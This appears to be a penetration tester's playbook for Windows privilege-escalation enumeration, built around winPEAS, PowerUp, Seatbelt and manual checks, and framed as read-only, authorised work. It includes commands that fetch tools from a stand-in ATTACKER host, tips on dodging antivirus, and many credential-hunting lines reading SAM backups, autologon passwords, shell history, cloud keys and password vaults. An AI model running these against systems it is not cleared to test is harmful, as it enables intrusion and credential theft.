# Windows enumeration playbook — winPEAS first
# In-scope host, approval-gated, READ-ONLY recon. Enumeration changes nothing; save raw output as evidence.
# Goal: produce enum.json/enum.txt that the vector table in windows_privesc_playbook.md keys off.
# (The winPEAS twin of the linux-privesc linpeas.sh playbook.)

`whoami /all` is the single highest-signal command on Windows (token privileges decide everything). Run
**winPEAS** as the spine, confirm with PowerUp/Seatbelt, and feed `systeminfo` to WES-NG offline for the
patch/kernel angle.

═══════════════════════════════════════════════════════════════════════════
## 1. whoami — do this first
═══════════════════════════════════════════════════════════════════════════
```
whoami /all        # GROUPS + PRIVILEGES + integrity level. The headline:
whoami /priv       #   SeImpersonatePrivilege / SeAssignPrimaryToken -> Potato -> SYSTEM
                   #   SeBackupPrivilege   -> read SAM/SYSTEM        SeRestorePrivilege -> write anywhere
                   #   SeDebugPrivilege    -> open lsass             SeTakeOwnership   -> own any file (utilman)
whoami /groups     # BUILTIN\Administrators but filtered by UAC? -> UAC bypass path
```
An enabled `Se*Privilege` is usually a faster, safer win than any exploit — check here before running winPEAS.

═══════════════════════════════════════════════════════════════════════════
## 2. winPEAS — the spine
═══════════════════════════════════════════════════════════════════════════

### Get it onto the target
```
# SMB share from attacker:   impacket-smbserver share . -smb2support
#   target:  copy \\ATTACKER\share\winPEASx64.exe C:\Windows\Temp\wp.exe
# certutil / PowerShell download:
certutil -urlcache -split -f http://ATTACKER/winPEASx64.exe C:\Windows\Temp\wp.exe
powershell -c "iwr http://ATTACKER/winPEASx64.exe -OutFile $env:TEMP\wp.exe"
# AV/AMSI flags winPEAS often -> use the .bat (winPEAS.bat), the obfuscated build, or run manual checks (§4).
```

### Run it (keep the output)
```
C:\Windows\Temp\wp.exe log=enum.txt            # all checks, write to file (= evidence)
winPEASany.exe quiet cmd fast                   # quieter/faster; 'cmd' = non-coloured (readable in a plain shell)
winPEASx64.exe systeminfo userinfo servicesinfo # targeted sections (also: applicationsinfo windowscreds
                                                #   filesinfo processinfo networkinfo)
.\winPEAS.ps1                                    # PowerShell variant when the exe is blocked
```
Colour legend: **RED = interesting / likely a PE vector**, GREEN = a capability you already have. Every red
service/registry/cred hit maps to a row in `windows_privesc_playbook.md`. Extract them into `enum.json`.

═══════════════════════════════════════════════════════════════════════════
## 3. Second opinions
═══════════════════════════════════════════════════════════════════════════
```
powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"      # service/registry/DLL/cred checks + GUI-less
.\SharpUp.exe audit                                               # C# PowerUp
.\Seatbelt.exe -group=all                                        # host triage (creds, tokens, autoruns, …)
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended"
python wes.py systeminfo.txt                                      # WES-NG: run OFFLINE on attacker vs saved systeminfo
.\accesschk.exe -accepteula -uwcqv "Users" *                     # writable services for the Users group
```

═══════════════════════════════════════════════════════════════════════════
## 4. Manual enumeration — confirm + fill gaps (works when AV eats winPEAS)
═══════════════════════════════════════════════════════════════════════════
```
## System / patch
systeminfo        &  wmic qfe get HotFixID        # -> WES-NG / exploit-suggester
hostname & ver & echo %PROCESSOR_ARCHITECTURE%

## Services — unquoted path / weak perms / writable binary
Get-CimInstance Win32_Service | ? { $_.PathName -notmatch '"' -and $_.PathName -match ' ' } | select Name,PathName,StartName
wmic service get name,pathname,startname | findstr /i /v '"'          # unquoted paths
.\accesschk.exe -accepteula -uwcqv "Authenticated Users" *           # SERVICE_CHANGE_CONFIG / _ALL_ACCESS
icacls "C:\Path\To\service.exe"                                      # (M)/(F) for your group = overwrite

## AlwaysInstallElevated (both must be 1)
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

## Scheduled tasks / autoruns
schtasks /query /fo LIST /v | findstr /i "TaskName Run As User Task To Run"
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
Get-CimInstance Win32_StartupCommand | select Name,Command,Location

## Saved credentials / loot
cmdkey /list                                                        # -> runas /savecred /user:<u> cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword   # autologon
reg query HKLM /f password /t REG_SZ /s      &   reg query HKCU /f password /t REG_SZ /s
type C:\Windows\Panther\Unattend.xml 2>nul & type C:\Unattend.xml 2>nul & type C:\sysprep.inf 2>nul
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
findstr /si "connectionString password" C:\inetpub\*.config C:\*\web.config
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /f "Proxy" /s
dir /s /b C:\*pass* C:\*cred* C:\*.kdbx 2>nul & cmdkey /list

## Installed software (vs known-vuln + DLL hijack)
wmic product get name,version,vendor      &      Get-ChildItem 'C:\Program Files','C:\Program Files (x86)'
```

## Output → evidence contract
- `enum.txt`  : raw winPEAS/whoami/manual output (verbatim) — PoC evidence.
- `enum.json` : distilled vectors `[{vector, evidence, section, risk, next}]` driving the exploit pass.
- READ-ONLY. Any tool dropped to disk (`C:\Windows\Temp\wp.exe`) is recorded in `cleanup.md` and removed.
  Never claim a vector winPEAS merely colour-coded — confirm it (accesschk/icacls/reg) before it's a finding.

---
## Extended arsenal — deeper host enumeration (net-new: service-key ACL, drivers, named pipes, process/PATH DACLs, ADS, UAC & cred-control posture, triggers, network)
# READ-ONLY — none of this changes state. Confirms vectors the table in windows_privesc_playbook.md keys off. Save raw output as evidence.
```
## Service REGISTRY-key perms (beyond the binary/config perms in §4)
accesschk.exe -accepteula -kvuqsw "Users" hklm\System\CurrentControlSet\Services   # writable service keys -> ImagePath repoint
Get-Acl HKLM:\System\CurrentControlSet\Services\<svc> | fl                          # inspect one key's ACL
sc qtriggerinfo <svc>                                                               # start triggers (alt to SERVICE_START)

## Drivers (BYOVD surface) — list, cross-check hashes OFFLINE vs a known-vuln list; load nothing
driverquery /v /fo csv       &   Get-CimInstance Win32_SystemDriver | select Name,PathName,State,StartMode

## Named pipes (potato / impersonation surface)
[System.IO.Directory]::GetFiles("\\.\pipe\")                                        # enumerate pipes (or pipelist.exe)

## Process & PATH DACLs (DLL-hijack / binary-overwrite surface)
Get-Process | select Name,Path | sort Path -u                                       # then icacls each unique binary dir
"$env:Path".Split(';') | % { icacls $_ 2>$null } | findstr /i "(M) (F) (W) Users Everyone Authenticated"   # writable PATH dir

## Alternate Data Streams on task/script targets (stealth-write surface)
dir /R C:\path\to\script.bat    &   Get-Item C:\path\to\* -Stream *

## UAC + credential security-control posture (decides UAC-bypass vs LSASS-read feasibility)
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential   # 1 = plaintext in LSASS
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL                     # 1 = LSASS protected (PPL)
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled 2>nul # LAPS present?

## Scheduled-task action targets + writability
Get-ScheduledTask | % { $_.TaskName + ' -> ' + ($_.Actions.Execute -join ',') }    # action targets to icacls
icacls C:\Windows\System32\Tasks\*                                                  # writable task XML?

## Network pivots (recon for lateral / next host)
netsh interface portproxy show all   &   netsh advfirewall firewall show rule name=all   &   route print   &   arp -a
net share   &   Get-SmbShare   &   net use                                          # shares + mapped drives
wsl -l -v 2>nul                                                                     # WSL distro = a second cred/file store
Get-Clipboard                                                                       # clipboard may hold a password
```

---
## Extended arsenal — extended credential-hunt locations (net-new stores beyond §"Saved credentials"; READ-ONLY, REDACT every hit to a fingerprint)
```
dir /s /b "%USERPROFILE%\Documents\*.rdg"                                           # RDCMan .rdg (DPAPI-wrapped)
dir /s /b "%APPDATA%\mRemoteNG\confCons.xml"                                        # mRemoteNG saved creds
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s                             # PuTTY host keys / proxy pw
reg query "HKCU\Software\Martin Prikryl\WinSCP 2\Sessions" /s   &   dir /s /b "%APPDATA%\FileZilla\sitemanager.xml"
reg query "HKCU\Software\OpenSSH\Agent\Keys" 2>nul                                  # OpenSSH agent keys in registry
dir /s /b *.kdbx *.psafe3 2>nul                                                     # KeePass / Password Safe DBs
dir /s /b "%USERPROFILE%\.aws\credentials" "%APPDATA%\gcloud\*" "%USERPROFILE%\.azure\*"   # cloud CLI creds
dir /s /b C:\*SiteList.xml 2>nul                                                    # McAfee SiteList (GPP-style AES)
dir /b C:\Windows\System32\config\RegBack\SAM C:\Windows\repair\SAM                 # SAM backups (+ matching SYSTEM)
dir /s /b C:\*.pfx C:\*.ovpn 2>nul                                                  # code-signing .pfx / OpenVPN auth-data
powershell -c "Get-ChildItem -Rec -Filter *.xml -EA 0 | Select-String 'System.Management.Automation.PSCredential'"  # Export-Clixml
# UWP Credential Locker (PasswordVault) — WinRT; enumerate NAMES only:
powershell -c "[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];(New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll()|select Resource,UserName"
```
Rule: every recovered secret is fingerprinted (len / charset / first-4) and discarded — never stored, logged, or reused.
